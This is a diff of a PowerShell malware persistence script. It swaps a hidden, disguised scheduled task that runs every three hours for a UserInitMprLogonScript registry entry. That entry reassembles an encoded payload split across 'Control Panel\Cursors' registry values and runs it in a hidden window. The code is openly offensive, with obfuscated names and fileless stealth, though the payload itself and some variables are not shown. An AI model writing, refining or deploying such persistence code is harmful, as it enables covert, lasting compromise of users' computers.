@@ -1,22 +1,9 @@
-# Get BIOS details for description/author
-$bios = Get-WmiObject -Class Win32_BIOS
-$taskDescription = $bios.SMBIOSBIOSVersion
-$taskAuthor = $bios.Manufacturer
+# Obfuscated variable name
+$varName = 'iou mDy0z3cvz5qgm eHM'
 
-# Task name
-$taskName = 'Version'
+# Command to read fragments, reassemble, and execute
+$logonCommand = "powershell.exe -WindowStyle Hidden -Command `"`$$varName = (Get-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name '$valueName1').'$valueName1' + (Get-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name '$valueName2').'$valueName2' + (Get-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name '$valueName3').'$valueName3'; powershell.exe -WindowStyle Hidden -EncodedCommand `$$varName`""
 
-# Action command (same as logon, with reassembly)
-$actionCommand = "-WindowStyle Hidden -Command `"`$$varName = (Get-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name '$valueName1').'$valueName1' + (Get-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name '$valueName2').'$valueName2' + (Get-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name '$valueName3').'$valueName3'; powershell.exe -WindowStyle Hidden -EncodedCommand `$$varName`""
-$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $actionCommand
-
-# Trigger: Every 3 hours
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 3) -RepetitionDuration (New-TimeSpan -Days 9999)
-
-# Principal and settings
-$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
-$settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
-
-# Register task
-$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description $taskDescription
-Register-ScheduledTask -TaskName $taskName -InputObject $task -User $env:USERNAME -Author $taskAuthor
+# Set in Environment key
+$envPath = 'HKCU:\Environment'
+Set-ItemProperty -Path $envPath -Name 'UserInitMprLogonScript' -Value $logonCommand -Type String
